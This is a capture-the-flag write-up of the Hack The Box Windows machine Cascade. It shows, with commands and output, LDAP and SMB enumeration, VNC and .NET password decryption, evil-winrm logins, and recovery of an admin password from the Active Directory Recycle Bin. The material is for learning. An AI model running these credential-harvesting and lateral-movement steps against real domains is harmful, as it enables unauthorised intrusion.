---
layout: post
title: Cascade Write-up - HTB
authors: galen
tags:
  - htb
---

![cascade badge](./cascadebadge.jpg)

Cascade is a Windows machine rated Medium on HTB.

## Port Scan

`nmap -sC -sV -p- 10.10.10.182`

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-04-15 07:08:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<SNIP>
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

This is a AD machine, so let's start with LDAP enumeration.

## LDAP Enumeration

Let's use the LDAP search tool: [ldapsearch](https://linux.die.net/man/1/ldapsearch).

```
root@kali:~/htb/cascade# ldapsearch -h 10.10.10.182 -b "DC=CASCADE,DC=LOCAL"
SASL/DIGEST-MD5 authentication started
Please enter your password: 
ldap_sasl_interactive_bind_s: Invalid credentials (49)
	additional info: 8009030C: LdapErr: DSID-0C09053E, comment: AcceptSecurityContext error, data 52e, v1db1
```

By default, ldapsearch tries to authenticate via [SASL](https://ldapwiki.com/wiki/SASL). As we don't have any credentials, we need to add a `-x` flag to turn off the SASL authentication.

`ldapsearch -x -h 10.10.10.182 -b "DC=CASCADE,DC=LOCAL"`

The `-b` flag sets the base for the search. And the default filter is `(objectClass=*)` which returns all objects. This is the broadest search possible, so it returns a lot of output.

A good start is to grep for passwords.

```
root@kali:~/htb/cascade# grep -Ei "passw|pwd" ldap.txt 
<SNIP>
cascadeLegacyPwd: clk0bjVldmE=
<SNIP>
```

We find a legacy password. Now let's zoom into this section to see which user this password belongs to.

```
sAMAccountName: r.thompson
<SNIP>
cascadeLegacyPwd: clk0bjVldmE=
```

We can decode the password as follows:

`echo clk0bjVldmE= | base64 -d`

Now that we have a set of credentials, it's time to try it out on other services.

## SMB Enumeration

Enumerating SMB shares with `r.thompson` reveals that the `Data` share is readable.

We can mount it to take a closer look by listing all files recursively.

```
# mount -t cifs -o username=r.thompson //10.10.10.182/Data /mnt/Data
Password for r.thompson@//10.10.10.182/Data:  ********
# cd Data/
# ls -alR
```

We find a note suggesting that `TempAdmin` uses the same password as the admin account, so let's bear that in mind,

```
root@kali:/mnt/Data# cat './IT/Email Archives/Meeting_Notes_June_2018.html'
<SNIP>
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
```

Also, we quickly zoom in on a VNC registry entry. (VNC is a remote access software.)

```
# cat './IT/Temp/s.smith/VNC Install.reg'
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
<SNIP>
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

We find what seems to be the password for the VNC application.

## VNC Password Decryption

Online research shows that the VNC password is encrypted. There are several tools for decrypting it.

We can decrypt it with [this utility - vncpasswd.py](https://github.com/trinitronx/vncpasswd.py). The `-H` flag tells the utility to expect hex input.

```
# python2 ./vncpasswd.py -d -H 6bcf2a4b6e5aca0f
<SNIP>
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'
```

Time to try this new credential it out on other services.

## Database Dumping

As winrm gives us the most direct channel into the machine, it's a good idea to try it first. 

```
# evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> ls
```

We can find **user.txt** in the Desktop folder.

Our earlier enumeration shows that there is an Audit share. While `r.thompson` does not have access to it, `s.smith` does. Let's see what we can find inside.

```
*Evil-WinRM* PS C:\Shares\Audit\DB> ls


    Directory: C:\Shares\Audit\DB


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/28/2020   9:39 PM          24576 Audit.db


*Evil-WinRM* PS C:\Shares\Audit\DB> download Audit.db
Info: Downloading C:\Shares\Audit\DB\Audit.db to Audit.db
```

We find an interesting Audit database file and exfiltrate it directly with evil-winrm.

Using sqlite3, we can examine it. `.schema` shows the tables in the database.

```
sqlite> .schema
CREATE TABLE IF NOT EXISTS "Ldap" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"uname"	TEXT,
	"pwd"	TEXT,
	"domain"	TEXT
);
CREATE TABLE sqlite_sequence(name,seq);
CREATE TABLE IF NOT EXISTS "Misc" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"Ext1"	TEXT,
	"Ext2"	TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"Username"	TEXT,
	"Name"	TEXT,
	"DistinguishedName"	TEXT
);
```

The `DeletedUserAudit` table shows that TempAdmin has been deleted, another piece of information to bear in mind,

```
sqlite> SELECT * FROM DeletedUserAudit;
<SNIP>
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
```

Also, the `Ldap` table contains a `pwd` field so let's loot it.

```
sqlite> SELECT * FROM Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

It appears to be an encrypted password for `ArkSvc`.

## Decompiling For Decryption Function

A batch file, `RunAudit.bat` in the `Audit` share gave us a clue towards decrypting the password.

```
*Evil-WinRM* PS C:\shares\audit> type RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

Let's take a closer look at `CascAudit.exe`.

```
# file CascAudit.exe 
CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

It is a .NET assembly. Let's decompile it with [JetBrains decompiler, dotPeek](https://www.jetbrains.com/decompiler/).

Looking at the decompiled code, this is what the CascAudit.exe does:

1. Retrieves and decrypts the password in the SQL table LDAP
2. Uses arksvc's account to retrieve attributes of deleted users using a LDAP query
3. Writes the retrieved information into the SQL table DeletedUserAudit

In particular, this is the pertinent line of code.

`str1 = Crypto.DecryptString(str2, "c4scadek3y654321");`

With this, we can decrypt the password. `Crypto` refers to `CascCrypto.dll` file so we will need to point to it.

dotPeek has a function to export the whole decompiled program as a C# project. It maintains the references to the DLL and is helpful for those unfamiliar with .NET projects (like me).

We can strip down the main program this way.

```
using System;
using CascCrypto;

namespace casc
{
    class Program
    {
        static void Main(string[] args)
        {
		    Console.WriteLine(Crypto.DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"));
        }
    }
}
```

We can get the password for `arksvc` with by running this short program.

## Probing Deleted AD Objects

Now let's switch to arksvc's account.

`evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd`

By running `whoami /all`, we gather that arksvc is a member of the `CASCADE\AD Recycle Bin` group.

Hence, let's take a closer look at the AD Recycle Bin.

With AD Recycle Bin, the majority of a deleted object's attributes are preserved. This is to facilitate recovery of deleted objects.

This means that a deleted user's password might be recoverable too.

* From the Meeting Notes we found earlier, we know that a `TempAdmin` shares the same password as the administrator. 
* However, the Audit.db records also show that `TempAdmin` has been deleted.

Now, let's retrieve deleted objects. Note the `includeDeletedObjects` parameter, without it, the [cmdlet](https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adobject?view=win10-ps) will not return deleted objects.

```
*Evil-WinRM* PS C:\Windows> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects
<SNIP>
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

After confirming that `TempAdmin` is among the deleted objects, let's retrieve all attributes of TempAdmin, referring to it by its `ObjectGUID`.

```
*Evil-WinRM* PS C:\Windows> Get-ADObject -Identity ‘f0cc344d-31e0-4866-bceb-a842791ca059’ -properties *  -includeDeletedObjects
<SNIP>
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
<SNIP>
```

We find another password which is probably base64 encoded like the first legacy password we found.

```
root@kali:~/htb/cascade# echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Let's try using it to log in as the administrator.

```
# evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator
```

And we are root.

# Thoughts

 This is a very enjoyable box. I especially like the continuous build-up from the early hints at TempAdmin to the final privilege escalation through AD Recycle Bin.

Also, it is a nice progression from Nest by the same author. I spent less time sorting out the tools for .NET programs this time as I've some experience from rooting Nest earlier.

**Active Directory Recycle Bin**

* https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/
* https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html

**Ldapsearch**

* https://docs.oracle.com/cd/E19450-01/820-6169/ldapsearch-examples.html#gentextid-4476 
* https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/

**VNC Key Decrypt**

* https://github.com/frizb/PasswordDecrypts
* https://github.com/trinitronx/vncpasswd.py
